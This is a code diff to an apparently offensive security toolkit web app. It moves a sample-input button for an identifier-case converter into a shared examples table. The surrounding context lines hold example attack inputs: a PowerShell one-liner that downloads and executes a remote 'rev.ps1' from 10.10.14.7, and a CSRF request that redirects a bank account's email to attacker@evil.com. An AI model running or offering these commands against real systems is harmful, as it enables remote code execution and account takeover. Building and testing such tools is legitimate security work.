@@ -3241,10 +3241,7 @@ TOOLS['notationer'] = {
         <div class="card">
           <div class="card-title">Input</div>
           <div class="field">
-            <div class="not-label-row">
-              <label>One identifier or phrase per line</label>
-              <button type="button" class="btn btn-ghost" id="not-example">Generate example</button>
-            </div>
+            <label>One identifier or phrase per line</label>
             <textarea id="not-in" placeholder="userProfileId\nmax retry count\nHTTP-Response-Code"></textarea>
           </div>
         </div>
@@ -3301,10 +3298,6 @@ TOOLS['notationer'] = {
       show(Math.min(cur, FORMATS.length - 1));
     };
     $('#not-in').addEventListener('input', render);
-    $('#not-example').addEventListener('click', () => {
-      $('#not-in').value = ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n');
-      render();
-    });
     render();
   }
 };
@@ -3539,6 +3532,7 @@ const EXAMPLES = {
   'jwt': () => { exFill('jwt-input', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'); exClick('jwt-decode'); },
   'cipher': () => { exFill('cip-input', 'Attack at dawn'); exFill('cip-shift', '3'); exClickText('Caesar'); },
   'ps-encode': () => { exFill('pe-in', "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"); },
+  'notationer': () => { exFill('not-in', ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n')); },
 
   // ---- Payloads ----
   'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'HTTPS'); exFill('csrf-submit', 'Auto-submit'); exClick('csrf-gen'); },
